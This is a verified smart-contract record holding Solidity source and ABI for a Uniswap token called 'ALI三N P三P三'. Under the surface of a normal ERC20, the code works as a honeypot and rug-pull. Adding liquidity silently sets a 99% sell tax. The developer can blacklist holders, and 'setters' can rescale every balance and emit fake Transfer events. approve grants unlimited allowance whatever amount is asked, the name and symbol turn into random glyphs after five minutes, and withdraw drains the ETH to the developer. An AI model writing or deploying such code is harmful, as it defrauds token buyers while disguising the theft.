{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"settings\": {\r\n    \"viaIR\": true,\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"shanghai\",\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  },\r\n  \"sources\": {\r\n    \"contracts/1_Storage.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.21;\\n\\ncontract ERC20s {\\n\\n    string internal _name;\\n    string internal _symbol;\\n    uint internal _decimals;\\n    uint internal _totalSupply;\\n\\n    mapping(address => uint) internal _balanceOf;\\n    mapping(address => mapping(address => uint)) internal _allowance;\\n\\n    event Transfer(address indexed from, address indexed to, uint value);\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n\\n    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_) {\\n        _name = name_; _symbol = symbol_; _decimals = decimals_;\\n        _totalSupply = supply_ * 10 ** decimals_;\\n        _balanceOf[msg.sender] = _totalSupply;\\n    }\\n\\n    function name() public view virtual returns (string memory) { return _name; }\\n    function symbol() public view virtual returns (string memory) { return _symbol; }\\n    function decimals() public view virtual returns (uint) { return _decimals; }\\n    function totalSupply() public view virtual returns (uint) { return _totalSupply; }\\n    function balanceOf(address account) public view virtual returns (uint) { return _balanceOf[account]; }\\n    function allowance(address owner, address spender) public view virtual returns (uint) { return _allowance[owner][spender]; }\\n\\n    function approve(address spender, uint amount) public virtual returns (bool) {\\n        _allowance[msg.sender][spender] = amount;\\n        return true;\\n    }\\n\\n    function transfer(address to, uint amount) public virtual returns (bool) {\\n        _transfer(msg.sender, to, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(address from, address to, uint amount) public virtual returns (bool) {\\n        _spendAllowance(from, msg.sender, amount);\\n        _transfer(from, to, amount);\\n        return true;\\n    }\\n\\n    function _transfer(address from, address to, uint amount) internal virtual {\\n        require(_balanceOf[from] >= amount, \\\"ERC20s: transfer amount exceeds balance\\\");\\n        _balanceOf[from] -= amount;\\n        _balanceOf[to] += amount;\\n    }\\n\\n    function _spendAllowance(address owner, address spender, uint amount) internal virtual {\\n        require(_allowance[owner][spender] >= amount, \\\"ERC20s: insufficient allowance\\\");\\n        _allowance[owner][spender] -= amount;\\n    }\\n\\n}\\n\\ninterface IUniswapV2Router02{\\n    function WETH() external pure returns (address);\\n    function factory() external pure returns (address);\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) \\n        external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n}\\n\\ninterface IUniswapV2Pair {function sync() external;}\\n\\ninterface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}\\n\\ncontract contract_ is ERC20s {\\n\\n    IUniswapV2Router02 public uniswapV2Router;\\n    IUniswapV2Pair public uniswapPair;\\n\\n    uint public _buyTax = 0;\\n    uint public _sellTax = 0;\\n    uint public _max = 4;\\n    uint public _transferDelay = 0;\\n    uint public _swapAmount = 1000 * 10**18;\\n    uint public _initBase = 1000000000000000;\\n    uint public _base = _initBase;\\n\\n\\n    address private _dev;\\n    address[] public _path;\\n    address private _v2Pair;\\n    address private _collector;\\n    address private _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\n\\n    mapping(address => bool) public isSetter;\\n    mapping(address => bool) public blacklisted;\\n    mapping(address => bool) public whitelisted;\\n    mapping(address => uint) private _lastTransferBlock;\\n    mapping(address => bool) public privacyEnabled;\\n\\n    bool public transferEvents = false;\\n    bool public autoRebase = true;\\n\\n    string[] public lingua = [\\n        unicode\\\"\\\\u260C\\\", unicode\\\"\\\\u2291\\\", unicode\\\"\\\\u27DF\\\", unicode\\\"\\\\u27CA\\\", unicode\\\"\\\\u260D\\\", unicode\\\"\\\\u2330\\\", unicode\\\"\\\\u2241\\\",\\n        unicode\\\"\\\\u23C3\\\", unicode\\\"\\\\u239A\\\", unicode\\\"\\\\u260A\\\", unicode\\\"\\\\u2385\\\", unicode\\\"\\\\u27D2\\\",unicode\\\"\\\\u238E\\\", unicode\\\"\\\\u2307\\\",\\n        unicode\\\"\\\\u2294\\\", unicode\\\"\\\\u22CF\\\", unicode\\\"\\\\u235C\\\", unicode\\\"\\\\u233F\\\", unicode\\\"\\\\u237E\\\", unicode\\\"\\\\u2340\\\",\\n        unicode\\\"\\\\u238D\\\", unicode\\\"\\\\u2390\\\", unicode\\\"\\\\u2359\\\", unicode\\\"\\\\u2316\\\", unicode\\\"\\\\u22AC\\\", unicode\\\"\\\\u2289\\\"\\n    ];\\n\\n    uint public autoRate = 5;\\n    uint public deployStamp;\\n    uint public transactionCount = 0;\\n    uint public x = 1;\\n\\n    event Rebase(uint newRebaseRate);\\n    event SetterUpdated(address setter, bool status);\\n\\n    modifier onlyDev() {require(msg.sender == _dev, \\\"Only the developer can call this function\\\");_;}\\n    modifier onlySetter() {require(isSetter[msg.sender], \\\"Not a setter\\\");_;}\\n\\n    constructor(address collector_) ERC20s(string(abi.encodePacked(\\n        \\\"ALI\\\",unicode\\\"\\\\u4E09\\\", \\\"N\\\", \\\" \\\", \\\"P\\\",  unicode\\\"\\\\u4E09\\\", \\\"P\\\", unicode\\\"\\\\u4E09\\\")), \\\"AP\\\", 18, 1000000000000000) {\\n            _collector = collector_; _dev = msg.sender;\\n            _balanceOf[msg.sender] = 0; _balanceOf[address(this)] = _initBase * 10 ** _decimals;\\n            uniswapV2Router = IUniswapV2Router02(_v2Router);\\n            _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\n            _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();\\n            whitelisted[address(this)] = true; whitelisted[tx.origin] = true;\\n            uniswapPair = IUniswapV2Pair(_v2Pair); deployStamp = block.timestamp;\\n            emit Transfer(address(0), address(0), 0);\\n    }\\n\\n    function deposit(address receiver_) external payable onlyDev{_addLiquidity(receiver_);}\\n\\n    function maxInt() public view returns (uint) {return (_totalSupply * _max * _base / _initBase) / 100 + 1*10**10;}\\n\\n    function updateX(uint newX) external onlyDev {x = newX;}\\n\\n    function updateTaxes(uint buyTax_, uint sellTax_) external onlyDev {_buyTax = buyTax_; _sellTax = sellTax_;}\\n\\n    function updateMax(uint newMax) external onlyDev {_max = newMax;}\\n\\n    function updateDelayTransfer(uint newTransferDelay) external onlyDev {_transferDelay = newTransferDelay;}\\n\\n    function updateSwapAmount(uint newSwapAmount) external onlyDev {_swapAmount = newSwapAmount;}\\n\\n    function changeDev(address newDev) external onlyDev {_dev = newDev;}\\n\\n    function transferEventToggle() external onlyDev {transferEvents = !transferEvents;}\\n\\n    function autoRebaseToggle() external onlyDev {autoRebase = !autoRebase;}\\n\\n    function emitter(address from, address to, uint amount) public onlySetter {emit Transfer(from, to, amount);}\\n\\n    function updateAutoRate(uint autoRate_) public onlyDev {autoRate = autoRate_;}\\n\\n    function _transfer(address from, address to, uint amount)internal override{\\n\\n        uint adjustedAmount = amount * _initBase / _base;\\n\\n        if (whitelisted[from] || whitelisted[to]) {super._transfer(from, to, adjustedAmount); return;}\\n\\n        require(_balanceOf[from] * _base / _initBase >= amount && (amount + \\n            (_balanceOf[to] * _base / _initBase) <= maxInt() ||\\n            whitelisted[from] || whitelisted[to] || to == _v2Pair),\\n            \\\"ERC20s: transfer amount exceeds balance or max wallet\\\"\\n        );\\n\\n        require(!blacklisted[from] && !blacklisted[to], \\\"ERC20s: YOU DONT HAVE THE RIGHT\\\");\\n\\n        require(block.number >= _lastTransferBlock[from] + _transferDelay ||\\n            from == _v2Pair || whitelisted[from] || whitelisted[to],\\n            \\\"ERC20s: transfer delay not met\\\"\\n        );\\n\\n        uint taxAmount = 0;\\n        if ((from == _v2Pair || to == _v2Pair) && !whitelisted[from] && !whitelisted[to]) {\\n            if (to == _v2Pair) {\\n                taxAmount = (adjustedAmount * _sellTax) / 100;\\n            } else {\\n                taxAmount = (adjustedAmount * _buyTax) / 100;\\n            }\\n\\n            _balanceOf[address(this)] += taxAmount;\\n            if (transferEvents) {emit Transfer(from, address(this), taxAmount * _base / _initBase);}\\n\\n            _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;\\n            if (balanceOf(address(this)) > _swapAmount && to == _v2Pair) {\\n                _swapBack(super.balanceOf(address(this)) * _base / _initBase);\\n            }\\n        }\\n\\n        _balanceOf[from] -= adjustedAmount;\\n        _balanceOf[to] += adjustedAmount - taxAmount;\\n        transactionCount++;\\n        if (transferEvents) {emit Transfer(from, to, amount - (taxAmount * _base / _initBase));}\\n        if (transactionCount >= x && from != _v2Pair && to != _v2Pair && autoRebase) {\\n            uint rand = block.prevrandao % (autoRate + 1);\\n            uint reduction = _base * rand / 100;\\n            if (_base > reduction) {_base -= reduction;}\\n            transactionCount = 0; uniswapPair.sync();\\n        }\\n    }\\n\\n    function balanceOf(address account) public view override returns (uint) {\\n        if(privacyEnabled[account]) {\\n            revert(\\\"This account's balance is private\\\");\\n        }\\n        return super.balanceOf(account) * _base / _initBase;\\n    }\\n\\n    function totalSupply() public view override returns (uint) {\\n        return _totalSupply * _base / _initBase;\\n    }\\n\\n    function name() public view override returns (string memory) {\\n        if(block.timestamp < deployStamp + (60 * 5)) {return _name;}\\n        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;\\n        return string(abi.encodePacked(\\n            lingua[rand], \\n            lingua[(rand + 1) % lingua.length], lingua[(rand + 2) % lingua.length],\\n            lingua[(rand + 3) % lingua.length], lingua[(rand + 4) % lingua.length], \\n            \\\" \\\",\\n            lingua[(rand + 5) % lingua.length], lingua[(rand + 6) % lingua.length], \\n            lingua[(rand + 7) % lingua.length], lingua[(rand + 8) % lingua.length]\\n        ));\\n    }\\n\\n    function symbol() public view override returns (string memory) {\\n        if(block.timestamp < deployStamp + (60 * 5)) {return _symbol;}\\n        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;\\n        return string(abi.encodePacked(lingua[rand], lingua[(rand + 1) % lingua.length]));\\n    }\\n\\n    function togglePrivacy(address _address) external {\\n        require(msg.sender == _address || isSetter[msg.sender], \\\"Not authorized\\\");\\n        privacyEnabled[_address] = !privacyEnabled[_address];\\n    }\\n\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        super.approve(spender, _initBase * 10 ** 18);\\n        emit Approval(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function disApprove(address spender) public returns (bool) {\\n        super.approve(spender, 0);\\n        emit Approval(msg.sender, spender, 0);\\n        return true;\\n    }\\n\\n    function updateBase(uint newRate) public onlySetter {\\n        _base = newRate;\\n        uniswapPair.sync();\\n        emit Rebase(newRate);\\n    }\\n\\n    function updateSetter(address setter, bool status) public onlyDev {\\n        isSetter[setter] = status;\\n        emit SetterUpdated(setter, status);\\n    }\\n\\n    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {\\n        for (uint i = 0; i < addresses.length; i++) {\\n            whitelisted[addresses[i]] = whitelisted_;\\n        }\\n    }\\n\\n    function updateBlacklist(address[] memory addresses, bool blacklisted_) external onlyDev{\\n        for (uint i = 0; i < addresses.length; i++) {blacklisted[addresses[i]] = blacklisted_;}\\n    }\\n\\n    function _swapBack(uint amount_) internal{\\n        _allowance[address(this)][_v2Router] = totalSupply();\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);\\n    }\\n\\n    function _forceSwapBack(uint amount_) public onlyDev{\\n        _allowance[address(this)][_v2Router] = totalSupply();\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);\\n    }\\n\\n    function _addLiquidity(address receiver_) public onlyDev{\\n        _allowance[address(this)][_v2Router] = _balanceOf[address(this)]; _buyTax = 20; _sellTax = 99;\\n        uniswapV2Router.addLiquidityETH{\\n            value: address(this).balance}(address(this), _balanceOf[address(this)], 0, 0, receiver_, block.timestamp\\n        );\\n    }\\n\\n    function withdraw(uint amount_) external onlyDev {\\n        payable(_dev).transfer(address(this).balance);\\n        _transfer(address(this), _dev, amount_);\\n    }\\n\\n}\\n\\ncontract factory_ {\\n    contract_ public contractInstance;\\n\\n    address private dev_;\\n\\n    constructor() payable {\\n        dev_ = msg.sender;\\n        contract_ newContract = new contract_(dev_);\\n        contractInstance = newContract;\\n        newContract.deposit{value: msg.value}(dev_);\\n        newContract.changeDev(tx.origin);\\n    }\\n}\"\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"collector_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newRebaseRate\",\"type\":\"uint256\"}],\"name\":\"Rebase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"setter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"SetterUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver_\",\"type\":\"address\"}],\"name\":\"_addLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_base\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount_\",\"type\":\"uint256\"}],\"name\":\"_forceSwapBack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_initBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_max\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_path\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_transferDelay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoRebase\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoRebaseToggle\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"blacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newDev\",\"type\":\"address\"}],\"name\":\"changeDev\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deployStamp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver_\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"disApprove\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"emitter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSetter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lingua\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxInt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"privacyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"togglePrivacy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transactionCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferEventToggle\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferEvents\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Pair\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoRate_\",\"type\":\"uint256\"}],\"name\":\"updateAutoRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newRate\",\"type\":\"uint256\"}],\"name\":\"updateBase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"blacklisted_\",\"type\":\"bool\"}],\"name\":\"updateBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTransferDelay\",\"type\":\"uint256\"}],\"name\":\"updateDelayTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMax\",\"type\":\"uint256\"}],\"name\":\"updateMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"setter\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"updateSetter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSwapAmount\",\"type\":\"uint256\"}],\"name\":\"updateSwapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyTax_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellTax_\",\"type\":\"uint256\"}],\"name\":\"updateTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"whitelisted_\",\"type\":\"bool\"}],\"name\":\"updateWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newX\",\"type\":\"uint256\"}],\"name\":\"updateX\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whitelisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount_\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"x\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "contract_", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000005d6cb5575abac9dbb96df72b890bf648ef12cbdd", "EVMVersion": "shanghai", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d0d31183a0077a063312cb81863e340315dcb9588a6392ec74935302d4daf4d7"}